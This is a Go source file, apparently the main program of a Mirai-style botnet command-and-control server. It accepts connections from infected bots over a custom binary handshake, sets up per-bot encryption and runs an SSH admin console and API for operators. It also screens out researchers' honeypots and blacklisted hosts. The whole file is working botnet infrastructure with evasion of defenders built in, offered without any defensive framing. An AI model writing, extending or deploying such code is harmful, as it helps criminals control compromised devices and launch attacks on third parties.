package main

import (
	"fmt"
	"net"
	"os"
	"path/filepath"
	"errors"
	"time"
)

var appConfig *Config
var theme *Theme
var uiManager *UIManager
var clientList *ClientList = NewClientList()
var database *Database

func configDir() string {
	exe, err := os.Executable()
	if err == nil {
		dir := filepath.Dir(exe)
		cfg := filepath.Join(dir, "config")
		if info, statErr := os.Stat(cfg); statErr == nil && info.IsDir() {
			return cfg
		}
	}
	cfg := "config"
	if info, err := os.Stat(cfg); err == nil && info.IsDir() {
		return cfg
	}
	return "."
}

func main() {
	cfgDir := configDir()
	appConfig = LoadConfig(filepath.Join(cfgDir, "config.json"))
	theme = LoadTheme(filepath.Join(cfgDir, "theme.json"))
	uiManager = NewUIManager(cfgDir)

	database = NewDatabase(cfgDir)

	err := loadHoneypotPatterns(filepath.Join(cfgDir, "honeypot.json"))
	if err != nil {
		fmt.Println("[honeypot] failed to load patterns:", err)
	} else {
		fmt.Printf("[honeypot] loaded %d patterns\n", len(honeypotPatterns))
	}

	err = loadBlacklist(filepath.Join(cfgDir, "blacklist.json"))
	if err != nil {
		fmt.Println("[blacklist] failed to load:", err)
	} else {
		fmt.Println("[blacklist] loaded", len(blacklistEntries), "entries")
	}

	// SSH admin server
	go func() {
		if err := startSSHServer(appConfig.CNC.SSHPort); err != nil {
			fmt.Println("[ssh]", err)
		}
	}()

	// Bot listener (raw TCP)
	botAddr := fmt.Sprintf("0.0.0.0:%d", appConfig.CNC.BotPort)
	botListener, err := net.Listen("tcp", botAddr)
	if err != nil {
		fmt.Println("[bot] failed to bind:", err)
		return
	}
	fmt.Printf("[bot] listening on %s\n", botAddr)

	var apiServer *APIServer
	if appConfig.API.Enabled {
		apiServer = NewAPIServer(appConfig.API.Port)
		apiServer.Start()
	}

	go func() {
		for {
			time.Sleep(10 * time.Minute)
			database.SnapshotGroups()
		}
	}()

	for {
		conn, err := botListener.Accept()
		if err != nil {
			break
		}
		go handleBot(conn)
	}

	if apiServer != nil {
		apiServer.Stop()
	}

	fmt.Println("ERROR: run ulimit -n 999999")
}

func handleBot(conn net.Conn) {
	defer conn.Close()

	if checkAndBlockHoneypot(conn) {
		return
	}

	conn.SetDeadline(time.Now().Add(10 * time.Second))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)
	if err != nil || l <= 0 {
		return
	}

	if l == 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		if buf[3] > 0 {
			string_len := make([]byte, 1)
			l, err := conn.Read(string_len)
			if err != nil || l <= 0 {
				return
			}
			var source string
			if string_len[0] > 0 {
				source_buf := make([]byte, string_len[0])
				l, err := conn.Read(source_buf)
				if err != nil || l <= 0 {
					return
				}
				source = string(source_buf)
			}
			seed_buf := make([]byte, 4)
			if err := readXBytes(conn, seed_buf); err != nil {
				return
			}
			seed := bytesToUint32(seed_buf)

			var botSalt []byte
			if buf[3] >= 2 {
				salt_buf := make([]byte, 32)
				if err := readXBytes(conn, salt_buf); err != nil {
					return
				}
				botSalt = salt_buf
			}

			bot := NewBot(conn, buf[3], source)
			bot.crypto = NewCrypto(seed, botSalt)
			bot.Handle()
		} else {
			seed_buf := make([]byte, 4)
			if err := readXBytes(conn, seed_buf); err != nil {
				return
			}
			seed := bytesToUint32(seed_buf)
			bot := NewBot(conn, buf[3], "")
			bot.crypto = NewCrypto(seed, nil)
			bot.Handle()
		}
	}
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0

	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed unexpectedly")
		}
		tl += n
	}

	return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
